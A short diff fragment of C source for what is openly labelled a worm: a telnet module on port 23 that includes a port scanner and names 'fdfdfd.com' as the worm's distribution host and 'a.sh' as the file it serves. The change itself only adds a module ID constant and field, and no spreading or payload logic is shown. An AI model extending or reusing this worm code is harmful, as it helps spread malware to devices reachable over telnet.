@@ -21,6 +21,8 @@ w the credentials we expect there..
 #include "telnet.h"
 #include "portscan.h"
 
+#define TELNET_MODULE_ID 3
+
 // distribution host for WORM
 char distribution_host[] = "fdfdfd.com";
 char distribution_filename[] = "a.sh";
@@ -55,6 +57,8 @@ ModuleFuncs telnet_funcs = {
 Modules CLK_Telnet = {
     // required ( NULL, NULL, 0 )
     NULL, NULL, 0,
+    // module ID
+    TELNET_MODULE_ID,
     // port, state
     23, 0,
     // required 0, 0..  
